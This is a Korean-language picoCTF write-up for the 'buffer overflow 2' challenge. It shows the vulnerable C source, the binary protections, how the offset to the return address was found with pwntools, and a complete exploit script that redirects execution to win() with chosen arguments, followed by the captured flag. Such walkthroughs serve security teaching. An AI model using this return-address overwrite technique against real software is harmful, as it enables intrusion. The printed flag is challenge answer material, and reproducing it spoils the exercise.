# [buffer overflow 2](https://play.picoctf.org/practice/challenge/259?category=6&originalEvent=70&page=1)
<br />

**Discription:**
> Control the return address and arguments
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```
<br />

**Binary Protections:**
```yaml
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/buffer_overflow_2/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

# 1. 오프셋 구하기
문제를 풀이하기 위해서는 gets(buf)에서 발생하는 스택 버퍼오버플로우 취약점으로 `RET` 주소를 `win`으로 덮고 실행해야 합니다. 이때, win의 인자와 문제에서 요구하는 값과 일치해야 FLAG가 출력됩니다. 공격 코드를 작성하기 전 버퍼~RET까지의 오프셋을 구해야 합니다.
```bash
$ python3 -q
>>> from pwn import *
>>> p = process("./vuln")
[+] Starting local process './vuln': pid 754
>>> p.sendline(cyclic(200))
>>> p.wait()
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 754)
>>> Corefile("./core.754")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.754'
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xff84a760
    Exe:       '/home/kali/pico/vuln' (0x8048000)
    Fault:     0x62616164
Corefile('/home/kali/pico/core.754')
>>> cyclic_find(0x62616164)
112
```
오프셋은 112 입니다.

> [!NOTE]
> 위 처럼 구할 수 있는 이유?
> <br />
>
> 프로그램 종료 전 RET은 스택 최상단에 있는 복귀 주소(Return address)를 꺼내어 EIP에 넣고 프로그램의 흐름을 호출자(main)로 되돌립니다. 그러나 패턴 문자열로 버퍼 오버플로우를 일으키면, 이 복귀 주소가 패턴 데이터로 덮이게 됩니다. 그 결과 RET은 정상적인 복귀 주소 대신 패턴의 일부를 EIP에 복사하게 되고, 프로그램은 잘못된 주소로 점프하려다 크래시가 발생하게 됩니다. 이때 EIP에 저장된 값이 패턴 문자열의 몇 번째 위치인지 확인하면, 버퍼의 시작점에서 부터 Return Address까지의 정확한 오프셋을 계산할 수 있습니다.
<br />


# 2. `win()`함수 인자의 정확한 오프셋 확인하기

```asm
   0x8049300 <win+106>    lea    eax, [ebp - 0x4c]
   0x8049303 <win+109>    push   eax
   0x8049304 <win+110>    call   fgets@plt                   <fgets@plt>

   0x8049309 <win+115>    add    esp, 0x10
 ► 0x804930c <win+118>    cmp    dword ptr [ebp + 8], 0xcafef00d
   0x8049313 <win+125>    jne    win+153                     <win+153>

   0x8049315 <win+127>    cmp    dword ptr [ebp + 0xc], 0xf00df00d
   0x804931c <win+134>    jne    win+156                     <win+156>
```
위 분석을 통해 첫 번째 인자는 `ebp + 0x8`에 위치하고, 두 번째 인자는 `ebp + 0xc`에 위치하는 것을 알 수 있습니다. 분석한 정보를 가지고 공격 코드를 작성할 수 있습니다.

```python
from pwn import *

p = process("./vuln")
# p = remote("saturn.picoctf.net", 55191)

pay = b"A"*112
pay += p32(0x8049296)  # win addr
pay += b"A"*4
pay += p32(0xCAFEF00D) # arg1 (ebp + 0x8)
pay += p32(0xF00DF00D) # arg2 (ebp + 0xc)

p.send(pay)
p.interactive()
```
```bash
$ python3 test.py
[+] Opening connection to saturn.picoctf.net on port 55191: Done
[*] Switching to interactive mode
Please enter your string:
$
\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA
picoCTF{argum3nt5_4_d4yZ_3c04eab0}[*] Got EOF while reading in interactive
$
```
